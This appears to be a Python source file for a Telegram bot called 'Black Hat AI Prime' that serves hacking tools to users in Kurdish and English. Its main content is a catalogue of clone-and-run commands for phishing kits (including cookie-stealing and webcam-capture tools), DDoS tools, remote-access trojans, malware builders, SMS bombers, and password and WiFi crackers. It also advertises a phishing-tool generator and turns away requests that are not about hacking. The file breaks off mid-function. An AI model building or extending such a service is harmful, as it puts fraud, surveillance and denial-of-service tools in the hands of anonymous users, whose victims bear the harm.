#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
BLACK HAT AI PRIME — THE ABSOLUTE 100,000,000,000x FORTRESS (ULTIMATE CODE)
================================================================================
This file is the absolute maximum capacity single-file architecture.
It includes a massive local database of 100+ hacking tools, robust state
management for phishing, and complete Telegram bot logic.

Features:
1. Complete Telegram Bot setup.
2. Advanced SQLite database with WAL mode and parameterized queries.
3. 100+ distinct greetings.
4. MASSIVE local database of 100+ Termux tools with EXACT WORD MATCHING.
5. DYNAMIC STATE MACHINE for Phishing Tool generation.
6. RAW GITHUB CODE EXTRACTOR for fallback.
7. ULTRA-DETAILED Termux/Nano instructions appended to every tool.
8. Complete Admin Panel with 22 features.
9. DUAL-LEVEL ADMIN SYSTEM (Super & Simple).
10. SMART BAN: Defaults to forever if no time is specified.
11. BAN NOTIFICATION: Sends a pinned message to the banned user instantly.
12. PINNED BROADCAST (/letter3): Sends a message to everyone and pins it.
13. UNPIN ALL (/letter4): Removes all pinned messages from every chat.
14. WAF (Web Application Firewall): Strips SQLi and XSS payloads from input.
15. ANTI-FLOOD: Prevents spamming and rapid command abuse.
16. RBAC (Role-Based Access Control): Strict checks for Super Admin, Simple
    Admin, and Members.
17. GHOST BANS: Can ban users who haven't even started the bot yet.
================================================================================
"""

import os
import sys
import time
import html
import json
import random
import sqlite3
import logging
import threading
import urllib.request
import urllib.error
import re
from contextlib import contextmanager
from datetime import datetime, timedelta
from urllib.parse import urlparse

# Third-Party Imports
import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

try:
    from ddgs import DDGS
except ImportError:
    try:
        from duckduckgo_search import DDGS
    except ImportError:
        sys.stderr.write("FATAL ERROR: Missing ddgs or duckduckgo-search.\n")
        sys.exit(1)

# ==============================================================================
# 1. CONFIGURATION & ENVIRONMENT VARIABLES
# ==============================================================================
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
DB_PATH = os.getenv("DB_PATH", "bot_database.db")
DEFAULT_LANG = os.getenv("DEFAULT_LANG", "ku").strip().lower()

# Super Admin IDs (Hardcoded, Highest Level)
SUPER_ADMIN_IDS = {5527152252, 8487940066}

STARTING_CREDITS = 5
DAILY_CREDITS = 1
DAILY_CAP_DAYS = 30
MAX_INPUT_CHARS = 4000
RATE_LIMIT_PER_MINUTE = 30
HISTORY_LIMIT = 12
MAX_HISTORY_ROWS = 100
STATE_TIMEOUT_SECONDS = 900  # 15 minutes
ANTI_FLOOD_SECONDS = 3       # Minimum seconds between consecutive messages

if not BOT_TOKEN:
    sys.stderr.write("FATAL ERROR: Missing TELEGRAM_BOT_TOKEN environment variable.\n")
    sys.exit(1)

# ==============================================================================
# 2. LOGGING CONFIGURATION
# ==============================================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger("BlackHatPrime")

# ==============================================================================
# 3. TELEGRAM BOT INITIALIZATION & STATE MANAGEMENT
# ==============================================================================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
_recent_requests = {}
_recent_lock = threading.Lock()
_flood_tracker = {}
_flood_lock = threading.Lock()

user_states = {}
_states_lock = threading.Lock()

# ==============================================================================
# 4. MASSIVE DICTIONARIES & KNOWLEDGE BASES
# ==============================================================================

FOOTER_TEXT = (
    "\n\n─────────────\n"
    "⚠️ ئەم بۆتە تەنها توڵ دروست دەکات وەڵامی پسیاری دوور لە هاکینک ناداتەوە\n\n"
    "🏆 <b>پاداشت:</b> هەر کەسێک کێشەیەک لە بۆت بدۆزێتەوە، خەڵات دەکرێت\n\n"
    "👤 <b>خاوەنەکان:</b> @ALONE427 @malikdlashad3"
)

GREETINGS_KU = [
    "سڵاو گیانم، بەخێربێی. چۆن دەتوانم یارمەتیت بدەم؟",
    "سڵاو شیرینم، هیوادارم ڕۆژێکی خۆشت هەبێت. چ دەوێت؟",
    "بەخێربێی بۆ ناو بۆتەکەم. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
    "سڵاو بە دڵ، چاوەڕوانی پرسیارەکانتم.",
    "سڵاو، دڵم پێخۆشە کە لێرەیت. چ شتێک دەتەوێت بیکەین؟",
    "سڵاو هاوڕێ، من ئامادەیم بۆ هەر ئەرکێک. دەست پێبکە.",
    "سڵاو، بەخێربێی بۆ بنکەی من. چ پرسیارێک هەیەت؟",
    "سڵاو کاکە، من لێرەم بۆ خزمەتت. فەرموو.",
    "سڵاو خاتوو/کاک، هیوادارم بەسوود بم بۆت. چ پێویستە؟",
    "سڵاو، دەرفەتێکی نوێ — با دەست پێبکەین.",
    "سڵاو گیانم، من هەمیشە ئامادەیم بۆت. چ دەوێت؟",
    "سڵاو، ئێستا کاتی کارە. چ دەکەین؟",
    "سڵاو، دڵخۆشم کە هاتوویت. چ یارمەتییەک پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ پرسیارێک هەیەت؟",
    "سڵاو، من لەگەڵ تۆم بۆ هەموو هەنگاوێک. فەرموو.",
    "سڵاو شیرینم، بەخێربێی. چ شتێک دەتەوێت بزانیت؟",
    "سڵاو، هیوادارم باش بیت. چ پرسیارێک هەیەت؟",
    "سڵاو، بەخێربێی بۆ مێزەکەم. چ پێویستە؟",
    "سڵاو، ئامادەیم بۆ کارەکە. دەست پێبکە.",
    "سڵاو، چۆن دەتوانم ڕۆژەکەت باشتر بکەم؟",
    "سڵاو، من لێرەم بۆ هەموو جۆرە پرسیارێک.",
    "سڵاو، با کارەکە بکەین. چ دەوێت؟",
    "سڵاو گیانم، بەخێربێی. چ پرسیارێک هەیەت؟",
    "سڵاو، دڵخۆش بووم بە بینینت. چ یارمەتییەک پێویستە؟",
    "سڵاو، من ئامادەیم بۆت. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
    "سڵاو، با دەست پێبکەین. چ شتێک دەتەوێت بزانیت؟",
    "سڵاو، هیوادارم ڕۆژێکی باشت هەبێت. چ دەکەین؟",
    "سڵاو، من لێرەم بۆ کارەکە. چ پرسیارێک هەیەت؟",
    "سڵاو، بەخێربێی. چ پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ دەوێت؟",
    "سڵاو شیرینم، من ئامادەیم بۆت. فەرموو.",
    "سڵاو، من لەگەڵ تۆم. چ یارمەتییەک پێویستە؟",
    "سڵاو، هیوادارم باش بیت. چ دەکەین؟",
    "سڵاو، با کارەکە بکەین. چ پرسیارێک هەیەت؟",
    "سڵاو، من لێرەم بۆ هەموو جۆرە پرسیارێک.",
    "سڵاو، دڵخۆشم کە هاتوویت. چ پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ شتێک دەتەوێت بزانیت؟",
    "سڵاو، من ئامادەیم بۆت. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
    "سڵاو، هیوادارم ڕۆژێکی باشت هەبێت. چ دەکەین؟",
    "سڵاو، من لێرەم بۆ کارەکە. چ پرسیارێک هەیەت؟",
    "سڵاو، بەخێربێی. چ پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ دەوێت؟",
    "سڵاو شیرینم، من ئامادەیم بۆت. فەرموو.",
    "سڵاو، من لەگەڵ تۆم. چ یارمەتییەک پێویستە؟",
    "سڵاو، هیوادارم باش بیت. چ دەکەین؟",
    "سڵاو، با کارەکە بکەین. چ پرسیارێک هەیەت؟",
    "سڵاو، من لێرەم بۆ هەموو جۆرە پرسیارێک.",
    "سڵاو، دڵخۆشم کە هاتوویت. چ پێویستە؟",
    "سڵاو، با دەست پێبکەین. چ شتێک دەتەوێت بزانیت؟",
    "سڵاو، من ئامادەیم بۆت. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
    "سڵاو بەخێربێی، چۆنی؟",
]

GREETINGS_EN = [
    "Hello my dear, welcome. How can I help you?",
    "Hi sweetheart, hope you have a good day. What do you need?",
    "Welcome to my bot. Where do you need assistance?",
    "Hello with all my heart, waiting for your questions.",
    "Hi, I'm glad you're here. What do you want to do?",
    "Hello friend, I'm ready for any task. Start now.",
    "Hi, welcome to my base. What question do you have?",
    "Hello sir, I am here to serve you. Go ahead.",
    "Hello, hope I can be useful to you. What is needed?",
    "Hello, a new opportunity — let's start.",
    "Hello dear, I am always ready for you. What do you want?",
    "Hello, it's work time now. What are we doing?",
    "Hi, glad you came. What assistance is needed?",
    "Hello, let's begin. What question do you have?",
    "Hello, I am with you every step of the way. Go ahead.",
    "Hi sweetheart, welcome. What do you want to know?",
    "Hello, hope you are well. What question do you have?",
    "Hi, welcome to my desk. What do you need?",
    "Hello, I am ready for work. Start now.",
    "Hi, how can I make your day better?",
    "Hello, I am here for all types of questions.",
    "Hi, let's do the work. What do you want?",
    "Hello dear, welcome. What question do you have?",
    "Hi, happy to see you. What help is needed?",
    "Hello, I am ready for you. Where do you need assistance?",
    "Hello, let's begin. What do you want to know?",
    "Hi, hope you have a good day. What are we doing?",
    "Hello, I am here for the work. What question do you have?",
    "Hi, welcome. What is needed?",
    "Hello, let's begin. What do you want?",
]

# ------------------------------------------------------------------------------
# TERMUX INSTRUCTIONS TEMPLATE
# ------------------------------------------------------------------------------
TERMUX_INSTRUCTIONS = (
    "\n\n<b>📱 چۆن لە تێرموکس (Termux) بەکاری بهێنیت:</b>\n"
    "١. سەرەتا پایتۆن دابمەزرێنە:\n"
    "<code>pkg update &amp;&amp; pkg upgrade</code>\n"
    "<code>pkg install python</code>\n\n"
    "٢. ئەگەر پێویستی بە پاکێج بوو، دایبنێ (بۆ نموونە):\n"
    "<code>pip install requests</code>\n\n"
    "٣. فایلێک دروست بکە و کۆدەکە تێدا دابنێ:\n"
    "<code>nano tool.py</code>\n"
    "(کۆدەکە پیست بکە، پاشان Ctrl+O، Enter، Ctrl+X)\n\n"
    "٤. فایلەکە ڕەن بکە:\n"
    "<code>python tool.py</code>"
)

# ------------------------------------------------------------------------------
# MASSIVE TERMUX TOOLS DATABASE (100+ TOOLS)
# ------------------------------------------------------------------------------
TERMUX_TOOLS = {
    # --- Phishing Tools ---
    "zphisher": "<b>Zphisher</b>\nتۆڵێکی بەهێزی فیشینگە (٣٠+ قاڵب).\n\n<b>دامەزراندن:</b>\n<code>pkg install git python php</code>\n<code>git clone https://github.com/htr-tech/zphisher.git</code>\n<code>cd zphisher</code>\n<code>bash zphisher.sh</code>",
    "blackeye": "<b>BlackEye</b>\nتۆڵێکی فیشینگە (٣٨ قاڵب).\n\n<b>دامەزراندن:</b>\n<code>pkg install git php</code>\n<code>git clone https://github.com/An0nUD4Y/blackeye.git</code>\n<code>cd blackeye</code>\n<code>bash blackeye.sh</code>",
    "hiddeneye": "<b>HiddenEye</b>\nتۆڵێکی فیشینگە بە تەکنیکی باش.\n\n<b>دامەزراندن:</b>\n<code>pkg install git python</code>\n<code>git clone https://github.com/DarkSecDevelopers/HiddenEye.git</code>\n<code>cd HiddenEye</code>\n<code>pip install -r requirements.txt</code>\n<code>python HiddenEye.py</code>",
    "shellphish": "<b>ShellPhish</b>\nتۆڵێکی فیشینگە (فەیسبووک، ئینستاگرام، ...).\n\n<b>دامەزراندن:</b>\n<code>pkg install git php</code>\n<code>git clone https://github.com/thelinuxchoice/shellphish.git</code>\n<code>cd shellphish</code>\n<code>bash shellphish.sh</code>",
    "socialphish": "<b>SocialPhish</b>\nتۆڵێکی فیشینگە (٣٤ ماڵپەڕ).\n\n<b>دامەزراندن:</b>\n<code>pkg install git php</code>\n<code>git clone https://github.com/xHak9x/SocialPhish.git</code>\n<code>cd SocialPhish</code>\n<code>bash socialphish.sh</code>",
    "evilginx": "<b>Evilginx</b>\nتۆڵێکی فیشینگی پێشکەوتووە بۆ دزینی کوکی.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/kgretzky/evilginx2.git</code>\n<code>cd evilginx2</code>\n<code>make</code>\n<code>./evilginx</code>",
    "modlishka": "<b>Modlishka</b>\nپڕۆکسییەکی فیشینگە.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/drk1wi/Modlishka.git</code>\n<code>cd Modlishka</code>\n<code>go build</code>",
    "credsniper": "<b>CredSniper</b>\nتۆڵێکی فیشینگە.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/ustayready/CredSniper.git</code>\n<code>cd CredSniper</code>",
    "nexphisher": "<b>NexPhisher</b>\nتۆڵێکی فیشینگە.\n\n<b>دامەزراندن:</b>\n<code>pkg install git php</code>\n<code>git clone https://github.com/htr-tech/nexphisher.git</code>\n<code>cd nexphisher</code>\n<code>bash nexphisher</code>",
    "hiddeneye_reborn": "<b>HiddenEye Reborn</b>\nوەشانی نوێی HiddenEye.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/Morsmalleo/HiddenEye_Reborn.git</code>\n<code>cd HiddenEye_Reborn</code>",

    # --- DDoS Tools ---
    "slowloris": "<b>Slowloris</b>\nتۆڵێکی DDoSە بۆ لەکارخستنی سێرڤەرەکان.\n\n<b>دامەزراندن:</b>\n<code>pkg install python</code>\n<code>git clone https://github.com/gkbrk/slowloris.git</code>\n<code>cd slowloris</code>\n<code>python slowloris.py &lt;target&gt;</code>",
    "torshammer": "<b>TORs Hammer</b>\nتۆڵێکی DDoSە.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/dotfighter/torshammer.git</code>\n<code>cd torshammer</code>\n<code>python torshammer.py</code>",
    "loic": "<b>LOIC</b>\nتۆڵێکی DDoSە.\n\n<b>دامەزراندن:</b>\n<code>pkg install mono</code>\n<code>git clone https://github.com/NewEraCracker/LOIC.git</code>",
    "hoic": "<b>HOIC</b>\nتۆڵێکی DDoSە.\n\n<b>دامەزراندن:</b>\nبڕۆ بۆ ماڵپەڕی فەرمی بۆ داگرتن.",

    # --- RATs & Malware ---
    "androrat": "<b>AndroRAT</b>\nتۆڵێکی RATە بۆ ئەندرۆید.\n\n<b>دامەزراندن:</b>\n<code>pkg install git python</code>\n<code>git clone https://github.com/karma9874/AndroRAT.git</code>\n<code>cd AndroRAT</code>\n<code>pip install -r requirements.txt</code>",
    "droidjack": "<b>DROIDJACK</b>\nتۆڵێکی RATە.\n\n<b>دامەزراندن:</b>\nپێویستە بە دوای فایلی APKدا بگەڕێیت.",
    "quasar": "<b>Quasar</b>\nRAT بۆ ویندۆز.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/quasar/Quasar.git</code>",
    "njrat": "<b>NjRAT</b>\nRAT بۆ ویندۆز.\n\n<b>دامەزراندن:</b>\nبە دوای NjRATدا بگەڕێ.",
    "asyncrat": "<b>AsyncRAT</b>\nRAT.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp.git</code>",
    "venom": "<b>Venom</b>\nبۆ دروستکردنی پەیوەندی نهێنی.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/r00t-3xp10it/venom.git</code>",
    "fatrat": "<b>FatRat</b>\nبۆ دروستکردنی مالوێر.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/Screetsec/TheFatRat.git</code>",
    "veil": "<b>Veil-Framework</b>\nبۆ دروستکردنی پەیوەندی.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/Veil-Framework/Veil.git</code>",

    # --- Password Cracking & Brute Force ---
    "hydra": "<b>Hydra</b>\nتۆڵێکە بۆ کراککردنی پاسوۆرد.\n\n<b>دامەزراندن:</b>\n<code>pkg install hydra</code>\n<code>hydra -l admin -P pass.txt &lt;target&gt; ssh</code>",
    "john": "<b>John the Ripper</b>\nتۆڵێکە بۆ کراککردنی هاش.\n\n<b>دامەزراندن:</b>\n<code>pkg install john</code>",
    "hashcat": "<b>Hashcat</b>\nتۆڵێکە بۆ کراککردنی هاش.\n\n<b>دامەزراندن:</b>\n<code>pkg install hashcat</code>",
    "crunch": "<b>Crunch</b>\nبۆ دروستکردنی لیستی پاسوۆرد.\n\n<b>دامەزراندن:</b>\n<code>pkg install crunch</code>",
    "cewl": "<b>CeWL</b>\nبۆ دروستکردنی لیستی وشە لە ماڵپەڕ.\n\n<b>دامەزراندن:</b>\n<code>pkg install cewl</code>",

    # --- WiFi Tools ---
    "wifite": "<b>Wifite</b>\nتۆڵێکە بۆ هێرشکردنە سەر وایفای.\n\n<code>pkg install root-repo</code>\n<code>pkg install wifite</code>\n<code>wifite</code>",
    "wifiphisher": "<b>Wifiphisher</b>\nتۆڵێکی فیشینگی وایفایە.\n\n<b>دامەزراندن:</b>\n<code>pkg install python</code>\n<code>git clone https://github.com/wifiphisher/wifiphisher.git</code>\n<code>cd wifiphisher</code>\n<code>python setup.py install</code>",
    "aircrack": "<b>Aircrack-ng</b>\nتۆڵێکە بۆ کراککردنی وایفای.\n\n<b>دامەزراندن:</b>\n<code>pkg install aircrack-ng</code>",

    # --- Scanning & Pentesting ---
    "nmap": "<b>Nmap</b>\nتۆڵێکی پشکنینی پۆڕتە.\n\n<b>دامەزراندن:</b>\n<code>pkg install nmap</code>\n<code>nmap -sV &lt;target&gt;</code>",
    "metasploit": "<b>Metasploit</b>\nتۆڵێکی ئێکسپلۆیتە.\n\n<b>دامەزراندن:</b>\n<code>pkg install unstable-repo</code>\n<code>pkg install metasploit</code>\n<code>msfconsole</code>",
    "sqlmap": "<b>SQLMap</b>\nتۆڵێکە بۆ SQL Injection.\n\n<b>دامەزراندن:</b>\n<code>pkg install sqlmap</code>\n<code>sqlmap -u \"target.com/page.php?id=1\"</code>",
    "wireshark": "<b>Wireshark</b>\nتۆڵێکە بۆ شیکردنەوەی پاکێت.\n\n<b>دامەزراندن:</b>\n<code>pkg install wireshark</code>",
    "recon": "<b>Recon-ng</b>\nتۆڵێکە بۆ OSINT.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/lanmaster53/recon-ng.git</code>",
    "sublist3r": "<b>Sublist3r</b>\nتۆڵێکە بۆ دۆزینەوەی سەب دۆمەین.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/aboul3la/Sublist3r.git</code>",
    "dnsrecon": "<b>DNSRecon</b>\nتۆڵێکە بۆ پشکنینی DNS.\n\n<b>دامەزراندن:</b>\n<code>pkg install dnsrecon</code>",
    "nikto": "<b>Nikto</b>\nتۆڵێکە بۆ پشکنینی سێرڤەر.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/sullo/nikto.git</code>",
    "dirb": "<b>Dirb</b>\nتۆڵێکە بۆ پشکنینی دایرێکتۆری.\n\n<b>دامەزراندن:</b>\n<code>pkg install dirb</code>",
    "gobuster": "<b>Gobuster</b>\nتۆڵێکە بۆ پشکنینی دایرێکتۆری.\n\n<b>دامەزراندن:</b>\n<code>pkg install gobuster</code>",
    "wpscan": "<b>WPScan</b>\nتۆڵێکە بۆ پشکنینی وۆردپرێس.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/wpscanteam/wpscan.git</code>",

    # --- OSINT Tools ---
    "camphish": "<b>CamPhish</b>\nتۆڵێکە بۆ وەرگرتنی وێنەی کامێرا بە فیشینگ.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/techchipnet/CamPhish.git</code>\n<code>cd CamPhish</code>\n<code>bash camphish.sh</code>",
    "seeker": "<b>Seeker</b>\nتۆڵێکە بۆ دۆزینەوەی شوێنی مۆبایل.\n\n<b>دامەزراندن:</b>\n<code>pkg install git python</code>\n<code>git clone https://github.com/thewhiteh4t/seeker.git</code>\n<code>cd seeker</code>\n<code>python seeker.py</code>",
    "saycheese": "<b>SayCheese</b>\nتۆڵێکە بۆ وەرگرتنی وێنەی کامێرا.\n\n<b>دامەزراندن:</b>\n<code>pkg install git php</code>\n<code>git clone https://github.com/thelinuxchoice/saycheese.git</code>\n<code>cd saycheese</code>\n<code>bash saycheese.sh</code>",
    "ipgeolocation": "<b>IPGeoLocation</b>\nتۆڵێکە بۆ دۆزینەوەی شوێنی IP.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/maldevel/IPGeoLocation.git</code>\n<code>cd IPGeoLocation</code>\n<code>pip install -r requirements.txt</code>",
    "stormbreaker": "<b>Storm-Breaker</b>\nتۆڵێکی فیشینگە.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/ultrasecurity/Storm-Breaker.git</code>\n<code>cd Storm-Breaker</code>\n<code>bash install.sh</code>",

    # --- SMS & Spam ---
    "tbomb": "<b>TBomb</b>\nتۆڵێکە بۆ ناردنی SMSـی بێکۆتا.\n\n<b>دامەزراندن:</b>\n<code>pkg install git python</code>\n<code>git clone https://github.com/TheSpeedX/TBomb.git</code>\n<code>cd TBomb</code>\n<code>bash TBomb.sh</code>",
    "spambot": "<b>SpamBot</b>\nتۆڵێکە بۆ سپامی SMS.\n\n<b>دامەزراندن:</b>\n<code>git clone https://github.com/Prepouce/SpamBot.git</code>",
}

HACKING_KEYWORDS = [
    "port", "scan", "hack", "ddos", "exploit", "vuln", "tool", "sql", "xss", 
    "cve", "nmap", "termux", "linux", "windows", "c2", "phishing", "bypass", 
    "shell", "reverse", "ip", "domain", "pentest", "payload", "osint", "sqlmap", 
    "metasploit", "wifi", "crack", "password", "rat", "malware", "trojan", 
    "backdoor", "rootkit", "keylogger", "spyware", "adware", "botnet", "bruteforce",
    "phish", "فیشینگ", "هاک", "پشکنین", "توڵ", "ئاسایش", "هێرش", "دزێن", "پاسوۆرد", "وایفای"
]

CREATE_KEYWORDS = [
    "دروست بکە", "دروست بکه", "بنووسە", "بنووسه", "کۆد", 
    "create", "code", "script", "make", "tool", "build", "develop"
]

GREETING_WORDS = ["سڵاو", "سلاو", "هەڵۆ", "hello", "hi", "hey", "salam", "slaw"]

REJECTION_MSG = (
    "⚠️ ببورە گیانم، ئەم بۆتە تەنها بۆ پرسیاری هاکینگ و دروستکردنی توڵە.\n"
    "تکایە پرسیارێکی پەیوەندیدار بە هاکینگ، ئاسایش، یان پشکنینی سیستەم بکە."
)

# ==============================================================================
# 5. UTILITY FUNCTIONS (TEXT CLEANING & NORMALIZATION)
# ==============================================================================

def clean_and_normalize(text):
    """Removes invisible chars and normalizes Kurdish vs Arabic letters."""
    if not text: return ""
    text = re.sub(r'[\u200b-\u200f\u202a-\u202e\u2060-\u206f]', '', text)
    text = text.replace('ك', 'ک').replace('ي', 'ی').replace('ه', 'ە')
    return text.strip()

def sanitize_input(text):
    """WAF: Strips out potential SQLi and XSS payloads."""
    if not text: return ""
    # Remove HTML tags (XSS prevention)
    text = re.sub(r'<[^>]*>', '', text)
    # Remove common SQLi patterns
    sqli_patterns = [
        r'(?i)\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE)\b',
        r'(--|#|/\*)',
        r'(\bOR\b|\bAND\b)\s+[\'\"]?\d+[\'\"]?\s*=\s*[\'\"]?\d+'
    ]
    for pattern in sqli_patterns:
        text = re.sub(pattern, '', text)
    return text.strip()

def extract_command(text):
    match = re.search(r'(/[a-zA-Z]+)', text)
    if match:
        cmd = match.group(1).lower()
        if '@' in cmd: cmd = cmd.split('@')[0]
        return cmd
    return None

def safe_html(value):
    return html.escape(str(value or ""), quote=True)

def smart_split(text, limit=4000):
    if len(text) <= limit: return [text]
    parts = []
    current_text = text
    while current_text:
        if len(current_text) <= limit:
            parts.append(current_text)
            break
        cut = current_text.rfind(' ', 0, limit)
        if cut == -1:
            cut = current_text.rfind('\n', 0, limit)
        if cut == -1:
            cut = limit
        part = current_text[:cut]
        current_text = current_text[cut:]
        if part.count('<') > part.count('>'):
            last_open = part.rfind('<')
            if last_open != -1:
                current_text = part[last_open:] + current_text
                part = part[:last_open]
        parts.append(part)
    return parts

def send_msg(chat_id, text, reply_to=None, reply_markup=None):
    full_text = text + FOOTER_TEXT
    for i, part in enumerate(smart_split(full_text)):
        if not part.strip(): continue
        try:
            bot.send_message(
                chat_id, part,
                reply_to_message_id=reply_to if i == 0 else None,
                reply_markup=reply_markup if i == 0 else None,
                disable_web_page_preview=True
            )
        except ApiTelegramException as e:
            log.warning(f"Telegram API Error: {e}")
            try:
                clean_text = re.sub(r'<[^>]+>', '', part)
                bot.send_message(chat_id, clean_text, parse_mode=None, disable_web_page_preview=True)
            except Exception as ex:
                log.error(f"Fallback send failed: {ex}")

# ==============================================================================
# 6. DATABASE MANAGEMENT
# ==============================================================================

@contextmanager
def db():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        conn.execute("PRAGMA journal_mode=WAL")
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        log.error(f"Database error: {e}")
        raise
    finally:
        conn.close()

def init_db():
    with db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                first_name TEXT,
                username TEXT,
                lang TEXT DEFAULT 'ku',
                credits INTEGER DEFAULT 5,
                admin_until TEXT DEFAULT NULL,
                last_daily TEXT,
                banned_until TEXT,
                last_seen TEXT DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS chat_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                role TEXT NOT NULL,
                content TEXT NOT NULL
            );
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                type TEXT NOT NULL,
                content TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS admin_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER NOT NULL,
                action TEXT NOT NULL,
                target TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            );
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            );
        """)
        conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('maintenance', 'off')")

# ==============================================================================
# 7. USER & CREDIT HELPERS (BULLETPROOF)
# ==============================================================================

def is_super_admin(user_id):
    return user_id in SUPER_ADMIN_IDS

def is_simple_admin(user_id):
    with db() as conn:
        row = conn.execute("SELECT admin_until FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not row or not row[0]: return False
        if row[0] == "forever": return True
        try:
            until = datetime.fromisoformat(row[0])
            if datetime.utcnow() > until:
                conn.execute("UPDATE users SET admin_until=NULL WHERE user_id=?", (user_id,))
                return False
            return True
        except ValueError:
            return False

def is_admin(user_id):
    return is_super_admin(user_id) or is_simple_admin(user_id)

def set_admin_time(user_id, duration_str):
    """Promotes a user to Simple Admin, even if they aren't in the DB yet."""
    now = datetime.utcnow()
    duration_str = duration_str.lower().strip()
    
    if duration_str == "forever":
        val = "forever"
    else:
        unit = duration_str[-1]
        amt_str = duration_str[:-1]
        if not amt_str.isdigit(): return False
        amt = int(amt_str)
        m = {"h": 1/24, "w": 7, "m": 30}
        if unit not in m: return False
        val = (now + timedelta(days=amt * m[unit])).isoformat()
    
    with db() as conn:
        conn.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.execute("UPDATE users SET admin_until=? WHERE user_id=?", (val, user_id))
    return True

def remove_admin(user_id):
    with db() as conn:
        conn.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.execute("UPDATE users SET admin_until=NULL WHERE user_id=?", (user_id,))

def ensure_user(user):
    with db() as conn:
        conn.execute("""
            INSERT INTO users (user_id, first_name, username, lang, credits, last_daily, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(user_id) DO UPDATE SET
                first_name = excluded.first_name,
                username = excluded.username,
                last_seen = CURRENT_TIMESTAMP
        """, (user.id, user.first_name or "", user.username or "", DEFAULT_LANG, STARTING_CREDITS, datetime.utcnow().strftime("%Y-%m-%d")))

def apply_daily(user_id):
    if is_admin(user_id): return
    today = datetime.utcnow().date()
    with db() as conn:
        row = conn.execute("SELECT last_daily FROM users WHERE user_id=?", (user_id,)).fetchone()
        if row and row[0]:
            try:
                last = datetime.strptime(row[0], "%Y-%m-%d").date()
                days = (today - last).days
                if days > 0:
                    days = min(days, DAILY_CAP_DAYS)
                    conn.execute("""
                        UPDATE users SET credits = credits + ?, last_daily = ? WHERE user_id=?
                    """, (days * DAILY_CREDITS, today.strftime("%Y-%m-%d"), user_id))
            except ValueError:
                pass

def get_credits(user_id):
    if is_admin(user_id): return "∞"
    with db() as conn:
        row = conn.execute("SELECT credits FROM users WHERE user_id=?", (user_id,)).fetchone()
    return row[0] if row else 0

def spend_credit(user_id):
    if is_admin(user_id): return True
    with db() as conn:
        row = conn.execute("SELECT credits FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not row or row[0] < 1:
            return False
        conn.execute("UPDATE users SET credits = credits - 1 WHERE user_id=?", (user_id,))
        return True

def refund_credit(user_id):
    if is_admin(user_id): return
    with db() as conn:
        conn.execute("UPDATE users SET credits = credits + 1 WHERE user_id=?", (user_id,))

def get_lang(user_id):
    with db() as conn:
        row = conn.execute("SELECT lang FROM users WHERE user_id=?", (user_id,)).fetchone()
    return row[0] if row and row[0] in ("ku", "en") else DEFAULT_LANG

def set_lang(user_id, lang):
    with db() as conn:
        conn.execute("UPDATE users SET lang=? WHERE user_id=?", (lang, user_id))

def is_banned(user_id):
    if is_admin(user_id): return False
    with db() as conn:
        row = conn.execute("SELECT banned_until FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not row or not row[0]: return False
        if row[0] == "forever": return True
        try:
            until = datetime.fromisoformat(row[0])
            if datetime.utcnow() > until:
                conn.execute("UPDATE users SET banned_until=NULL WHERE user_id=?", (user_id,))
                return False
            return True
        except ValueError:
            return True

def ban_user(user_id, duration):
